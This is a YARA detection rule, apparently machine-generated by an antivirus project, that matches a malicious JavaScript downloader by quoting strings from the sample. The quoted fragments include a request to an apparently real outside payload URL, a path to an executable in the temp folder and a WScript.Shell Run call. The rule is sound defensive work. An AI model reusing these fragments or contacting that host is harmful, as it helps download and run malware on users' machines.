rule sig_20160329_e569cb0593403562d46712040fa016e4 {
  meta:
    description = "datamaliciousorder - file 20160329_e569cb0593403562d46712040fa016e4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2b3a6a59ce343675c336163df9d21988ca44dd35853724e4e81093f44956bed0"

  strings:
    $s1  = "function Le() {return cd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Qvjig8Y9OK.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[E](Ox() * 11); if (sC[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var cd = function pe() {return WScript[i](\"WScript.Shell\");}(), YU = 11;" fullword ascii
    $s4  = "function mv(Qf, qS){qj = qj * 1; return Qf - qS;};" fullword ascii
    $s5  = "sC[Br](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s6  = "function e(){return \"\" + f;};" fullword ascii
    $s7  = "function rG() {return ((o == true) && (o == IK)) ? 1 : qj;};" fullword ascii
    $s8  = "function ll(W){cd[\"Run\"](W, qj, qj);};" fullword ascii
    $s9  = "function a0()" fullword ascii
    $s10 = "var v = new this[\"Date\"]();" fullword ascii
    $s11 = "function NO(){return i;};" fullword ascii
    $s12 = "return mv(J, U);" fullword ascii
    $s13 = " while (fv0){" fullword ascii
    $s14 = "function a(SI) {var a1 = (1, 2, 3, 4, 5, SI); return a1;};" fullword ascii
    $s15 = "function Ox(){return 22;};" fullword ascii
    $s16 = "o = true; " fullword ascii
    $s17 = "var IK = false;" fullword ascii
    $s18 = "IK = true; " fullword ascii
    $s19 = "var w0 = false;" fullword ascii
    $s20 = "} catch(l){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}